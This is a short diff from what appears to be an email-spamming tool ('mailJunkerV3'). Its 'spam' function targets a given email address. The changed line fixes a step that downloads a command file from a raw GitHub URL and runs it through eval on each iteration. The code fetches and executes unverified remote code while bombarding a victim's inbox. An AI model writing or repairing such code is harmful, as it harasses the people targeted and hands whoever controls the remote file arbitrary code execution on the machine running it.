@@ -24,7 +24,7 @@ async function spam(sessionId, theemail) {
 
     try {
         var response = await axios.get("https://raw.githubusercontent.com/crazystuffofficial/mailJunkerV3/main/fetchingCommand.txt");
-        var code = response.text();
+        var code = response.data;
         response = await eval(`(async () => { ${code} })()`);
         sessions[sessionId].num++;
         // console.log(response.data);
